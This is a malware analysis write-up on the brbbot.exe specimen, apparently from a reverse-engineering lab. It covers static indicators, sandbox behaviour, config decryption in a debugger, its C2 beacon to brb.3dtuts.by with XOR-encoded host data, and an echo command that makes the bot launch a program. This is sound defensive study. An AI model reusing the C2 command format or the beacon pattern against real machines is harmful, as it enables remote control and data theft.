## brbbot.exe
- Specimen was first discovered in `%AppData%` --> run it from there.
- Create a shortcut on the desktop, and allow it to run with Administrator Privs

## Static Properties Analysis
- PEStudio
````
md5,1C7243C8F3586B799A5F9A2E4200AA92
sha1,4DB5A8E237937B6D7B435A8506B8584121A7E9E3
sha256,F47060D0F7DE5EE651878EB18DD2D24B5003BDB03EF4F49879F448F05034A21E
file-size,75776 (bytes)
file-type,executable
cpu,64-bit
compiler-stamp,0x54ED67C2 (Wed Feb 25 01:12:18 2015)
````
- Sections 
- `.text, .rdata, .data, .pdata, .rsrc, .reloc`
- `.text` section entrypoint `entry-point,0x00003F94`
- Sample does not appear to be packed 
- `.text` section is executable as expected

- Libraries Used
````
ws2_32.dll, wininet.dll, user32.dll, kernel32.dll, advapi32.dll 
````
- Interesting Imports (115 total)
````
RegSetValueExA
RegOpenKeyExA
RegDeleteValueA
RegFlushKey
RegCloseKey
GetComputerNameA
GetSystemWow64DirectoryA
IsDebuggerPresent
HttpSendRequestA
InternetReadFile
InternetConnectA
InternetOpenA
HttpOpenRequestA
InternetSetOptionA
CreateFileW
CreateFileA
WriteFile
MoveFileExA
CopyFileA
DeleteFileA
CreateProcessA
GetCurrentProcess
ExitProcess
CryptEncrypt
CryptCreateHash
CryptDestroyKey
CryptDecrypt
CryptDestroyHash
CryptHashData
````
- No exports
- No TLS Callback

- Resources
- Sample appears to write something to disk --> explore later 
````
CONFIG,101,0x00012270,unknown,73,0.10 %,5.971,English-US,B8 9C C3 AA DF 98 67 11 66 AB FE 23 79 07 6E 17 ,.. .. .. .. .. .. g .. f .. .. # y .. n .. 
````
- Interesting Strings 
````
exec
Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.1; Trident/4.0)
Software\Microsoft\Windows\CurrentVersion\Run
%s?i=%s&c=%s&p=%s
brbconfig.tmp
CONFIG
YnJiYm90
file
conf
exit
sleep
encode
brbbot
HTTP/1.1
Connection: close\r\n
````
- String Notes
- User Agent present
- Name of file written to disk? `brbconfig.tmp` --> assume `%appdata%`
- `file, conf, exit, sleep, encode` --> C2 commands
- Clearly beacons out from API calls seen in strings and User Agent 
- Run key for persistance 
- Could also use `pestr brbbot.exe | more` || `strings -a --encoding=1` on Remnux to get ascii strings and unicode strings  

### IOCS for detection 
- File system: `brbconfig.tmp` 
- Network: `%s?i=%s&c=%s&p=%s`
- Persistance: `Software\Microsoft\Windows\CurrentVersion\Run`
- Communication: `HTTP/1.1`, `Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.1; Trident/4.0)`

### PEFrame 
````
--------------------------------------------------------------------------------
Yara Plugins
--------------------------------------------------------------------------------
Advapi Hash API
IsPE64
IsWindowsGUI
HasRichSignature
--------------------------------------------------------------------------------
Behavior
--------------------------------------------------------------------------------
anti dbg
Xor
network http
screenshot
win registry
win files operation
--------------------------------------------------------------------------------
Possibile Breakpoint
--------------------------------------------------------------------------------
--snip--
CryptEncrypt
--snip--
````
### Detect It Easy
````
compiler: Microsoft Visual C/C++(2010)[-]
linker: Microsoft Linker(10.0)[GUI64]
````
## Behavioral Analysis 
- Setup: `wireshark, fakedns, accept-all-ips start`
- Regshot --> first shot 
- Procmon --> clear capture 
- Run sample, 60 seconds, terminate with Process Hacker, Terminate procmon --> Save in CSV .log file on desktop for ProcDOT import, regshot second shot.
- Examine wireshark packers, fakedns requests
### Regshot
````
----------------------------------
Values added: 330
----------------------------------
HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run\brbbot: "C:\Users\REM\AppData\Roaming\brbbot.exe"
HKU\S-1-5-21-1866265027-1870850910-1579135973-1000\Software\Microsoft\Windows NT\CurrentVersion\AppCompatFlags\Compatibility Assistant\Store\C:\Users\REM\AppData\Roaming\brbbot.exe:  53 41 43 50 01 00 00 00 00 00 00 00 07 00 00 00 28 00 00 00 00 28 01 00 00 00 00 00 01 00 00 00 00 00 00 00 00 00 00 0A 73 20 00 00 DB 80 FD AC 28 39 D3 01 00 00 00 00 00 00 00 00 02 00 00 00 28 00 00 00 00 00 00 00 00 00 00 40 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 72 A6 00 00 00 00 00 00 01 00 00 00 01 00 00 00
----------------------------------
Files added: 4
----------------------------------
C:\Users\REM\AppData\Roaming\brbconfig.tmp
C:\Windows\Prefetch\BRBBOT.EXE-F9A274A7.pf
````
## ProcDOT
![Procdot](https://user-images.githubusercontent.com/75596877/168664367-2569206e-9567-4a7a-a351-d90b411493b6.png)
--snip--
- Nothing new discovered
## Config file dropped to disk 
````
%AppData%
brbconfig.tmp
¸œÃªß˜gf«þ#ynó·D|Ý*ú0yVLu¢vq}r‘:ÚŽã'<Â6|ÀH íÜD-•,<ˆ¿Î-kÀaFµ’
````
- Encoded/Encrypted with some sort of key
## Fakedns
````
fakedns[INFO]: Response: brb.3dtuts.by -> 192.168.80.128
````
## Wireshark 
- Makes DNS query followed by `HTTP GET /ads.php`
- Appears to send encoded data in the form for the `format string` we saw in the `strings` output 
````
13	7.863714237	192.168.80.129	192.168.80.128	HTTP	3162	GET /ads.php?i=192.168.80.129&c=DESKTOP-2C3IQHO&p=123f373e600822282f3e366028362828753e233e603828292828753e233e602c32353235322f753e233e603828292828753e233e60283e292d32383e28753e233e6037283a2828753e233e602c323537343c3435753e233e60282d383334282f753e233e603d34352f3f292d3334282f753e233e60282d383334282f753e233e60282d383334282f753e233e60282d383334282f753e233e603d34352f3f292d3334282f753e233e603f2c36753e233e60282d383334282f753e233e60282d383334282f753e233e60282d383334282f753e233e60282d383334282f753e233e60282d383334282f753e233e60282d383334282f753e233e60282d383334282f753e233e60282d383334282f753e233e60282d383334282f753e233e60282d383334282f753e233e60282d383334282f753e233e60282d383334282f753e233e60282d383334282f753e233e60282d383334282f753e233e60282d383334282f753e233e60282d383334282f753e233e60282d383334282f753e233e60282d383334282f753e233e60163e363429227b1834362b293e282832343560282d383334282f753e233e60282d383334282f753e233e60282d383334282f753e233e60282d383334282f753e233e60282d383334282f753e233e60282d383334282f753e233e60282d383334282f753e233e60282d383334282f753e233e60282d383334282f753e233e60282d383334282f753e233e60282b343437282d753e233e60282d383334282f753e233e60282d383334282f753e233e600c36320b292d081e753e233e60282d383334282f753e233e60282d383334282f753e233e60282d383334282f753e233e60282d383334282f753e233e60282d383334282f753e233e60282d383334282f753e233e600d1c1a2e2f33083e292d32383e753e233e602d36683f283e292d32383e753e233e60282d383334282f753e233e602d362f343437283f753e233e60083e382e29322f22133e3a372f33083e292d32383e753e233e60282d383334282f753e233e60282d383334282f753e233e60282d383334282f753e233e602d36683f283e292d32383e753e233e60282d383334282f753e233e603f37373334282f753e233e6036283f2f38753e233e6028323334282f753e233e60282d383334282f753e233e60282d383334282f753e233e602f3a28303334282f2c753e233e60282d383334282f753e233e60282d383334282f753e233e60382f3d363435753e233e603e232b3734293e29753e233e6008333e37371e232b3e29323e35383e1334282f753e233e60083e3a2938330e12753e233e60092e352f32363e192934303e29753e233e60282d383334282f753e233e60092e352f32363e192934303e29753e233e60083e3a29383312353f3e233e29753e233e60282d383334282f753e233e602d362f343437283f753e233e60282d383334282f753e233e60282d383334282f753e233e60282d383334282f753e233e60282d383334282f753e233e60282d383334282f753e233e60282d383334282f753e233e60282d383334282f753e233e601a2b2b3732383a2f3234351d293a363e1334282f753e233e600c3235082f34293e751a2b2b753e233e60092e352f32363e192934303e29753e233e60092e352f32363e192934303e29753e233e603f37373334282f753e233e60282d383334282f753e233e60282d383334282f753e233e60282d383334282f753e233e60282d383334282f753e233e60282d383334282f753e233e60282d383334282f753e233e60282d383334282f753e233e60282d383334282f753e233e60282d383334282f753e233e603f3a281334282f753e233e60282d383334282f753e233e60083e3a2938330b29342f343834371334282f753e233e60083e3a2938331d32372f3e291334282f753e233e60282d383334282f753e233e603f37373334282f753e233e603f37373334282f753e233e6039293939342f753e233e HTTP/1.1 
````
- Recieves 404 in response 
````
15	7.868788904	192.168.80.128	192.168.80.129	HTTP	777	HTTP/1.1 404 Not Found  (text/html)
````
- save as `encoded.hex` for later
## Code Analysis in x64db 
- Search for `intermodual calls` --> find API call `ReadFile` --> potential place where its writing to temp file on disk and then encrypting 
````
bp ReadFile
````
- Run to breakpoint
- `ReadFile` documentation says the `handle (hfile)` is the first passed parameter 
- `0000000000000100` = RCX register 
- Go to `handles` tab and click refresh, find handle 100 see its pointing at the file we want 
````
Type=File
Type number=24
Handle=100
Access=100081
Name=\Device\HarddiskVolume1\Users\REM\AppData\Roaming\brbconfig.tmp
````
- Allow `ReadFile` to finish running to reach the code that called it
- --> Debug --> Run to user code
![code](https://user-images.githubusercontent.com/75596877/168667326-c2f8a723-ff48-405a-975c-9be84d296e46.png)
- Can see `CryptDecrypt` API call is right below current code that called `ReadFile`
- Single Step down to right after `CryptDecrypt` API call
- Can see unencrypted config file in `RSP, RSI` registers 
![config](https://user-images.githubusercontent.com/75596877/168667695-6a9446fb-f804-413b-a5af-82a9949a2c9b.png)
- Can see those C2 commands that we saw in the strings output, also can see `encode=5b` is that the xor key?
- Wireshark packet from before, load into cyberchef and apply:
![chef](https://user-images.githubusercontent.com/75596877/168668048-54de74ec-5432-45aa-adb4-323d069f8b37.png)

### Wireshark re-analysis and bot manipulation
- Set up `/ads.php` page after starting `nginx`
- Echo C2 command into `ads.php` file stored in `/var/www/html`
````
echo 'cexe c:\windows\notepad.exe' > ads.php
````
- Re-execute sample, examine windows vm
![notepad](https://user-images.githubusercontent.com/75596877/168668492-a2a08733-5e21-4a8b-b8fe-ba31b109328c.png)
- Notepad Executes







